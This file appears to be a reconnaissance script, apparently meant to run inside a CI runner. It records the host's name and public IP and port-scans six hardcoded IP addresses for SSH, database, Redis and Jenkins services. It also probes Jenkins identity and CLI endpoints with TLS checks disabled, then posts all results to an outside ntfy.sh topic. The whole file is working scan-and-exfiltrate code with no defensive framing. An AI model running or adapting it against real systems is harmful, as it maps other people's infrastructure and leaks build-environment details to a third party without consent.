import os,sys,socket,time,ssl,json,urllib.request,re
TOPIC=os.environ.get("TOPIC","i50842gh-def")
CTX=ssl._create_unverified_context()
OUT=[]
def log(*a):
    line=" ".join(str(x) for x in a); print(line,flush=True); OUT.append(line)
def send(tag,text):
    text=str(text)
    for i in range(0,len(text),3000):
        body=("[%s %d] "%(tag,i//3000+1)).encode()+text[i:i+3000].encode("utf-8","replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/"+TOPIC,data=body,method="POST"),timeout=15,context=CTX).read(); break
            except Exception: time.sleep(1)
def tcp(host,port,t=8):
    s=socket.socket(); s.setblocking(True); s.settimeout(t); t0=time.time()
    try:
        s.connect((host,port)); return True,round((time.time()-t0)*1000)
    except Exception as e: return False,type(e).__name__
    finally:
        try: s.close()
        except: pass
def http(host,port,path="/",timeout=10,hosthdr=None):
    hdr={"User-Agent":"Mozilla/5.0","Connection":"close"}
    if hosthdr: hdr["Host"]=hosthdr
    url="http://%s:%d%s"%(host,port,path)
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers=hdr),timeout=timeout,context=CTX)
        b=r.read(4000); return r.status,dict(r.headers),b
    except urllib.error.HTTPError as e:
        try:b=e.read(4000)
        except:b=b""
        return e.code,dict(e.headers),b
    except Exception as e:
        return None,{},("ERR:"+str(e)[:100]).encode()
def main():
    log("RUNNER",socket.gethostname(),time.strftime("%FT%TZ",time.gmtime()))
    try: log("EGRESS",urllib.request.urlopen("https://api.ipify.org",timeout=12,context=CTX).read().decode().strip())
    except Exception as e: log("EGRESS_FAIL",type(e).__name__)
    log("=== CONTROLS ===")
    for h,p in [("1.1.1.1",443),("github.com",22),("8.8.8.8",53),("40.160.50.80",3000),("51.79.66.1",22),("51.79.66.1",443)]:
        ok,info=tcp(h,p); log("CTRL",h,p,"OPEN" if ok else "NO",info)
    log("=== TARGETS ===")
    targets={
      "51.79.66.166":[3000,8787,10051,80,443,22,3001,6379,3306],
      "51.222.15.95":[3000,22,8080,80,443,3001],
      "54.36.150.244":[8080,22,80,443,3001],
      "51.161.35.209":[22,80,443,3000,8080,3306,2055,8282],
      "51.222.31.227":[22,80,443,3306],
      "40.160.14.146":[8123,9000,80,443],
    }
    reach={}
    for h,ports in targets.items():
        reach[h]={}
        for p in ports:
            ok,info=tcp(h,p); reach[h][p]=ok
            log("TCP %s:%s"%(h,p),"OPEN:%s"%info if ok else "NO(%s)"%info)
    log("=== HTTP on open ports ===")
    httpmap={
      ("51.79.66.166",3000):["/api/status","/","/api/user/self"],
      ("51.79.66.166",8787):["/","/metrics","/api/status"],
      ("51.79.66.166",80):["/"],
      ("51.79.66.166",443):None,
      ("54.36.150.244",8080):["/","/login","/whoAmI/api/json","/jnlpJars/jenkins-cli.jar"],
      ("54.36.150.244",80):["/"],
      ("51.222.15.95",3000):["/api/status","/"],
      ("51.161.35.209",3000):["/api/status","/"],
    }
    for (h,p),paths in httpmap.items():
        if not reach.get(h,{}).get(p): continue
        if paths is None: continue
        for path in paths:
            st,hd,b=http(h,p,path)
            srv=hd.get("Server",""); title=""
            try:
                m=re.search(rb"<title>(.*?)</title>",b,re.I|re.S); title=m.group(1)[:80].decode("utf-8","replace") if m else ""
            except: pass
            log("HTTP %s:%s%s"%(h,p,path),"st=",st,"srv=",srv,"title=",title,"len=",len(b) if b else 0)
            if path in ("/","/api/status") and b:
                log("  BODY",b[:500].decode("utf-8","replace").replace("\n"," "))
    log("=== SECRETS CONTEXT (repo actions secrets) ===")
    send("REACH_I50842","\n".join(OUT))
    log("DONE")
main()
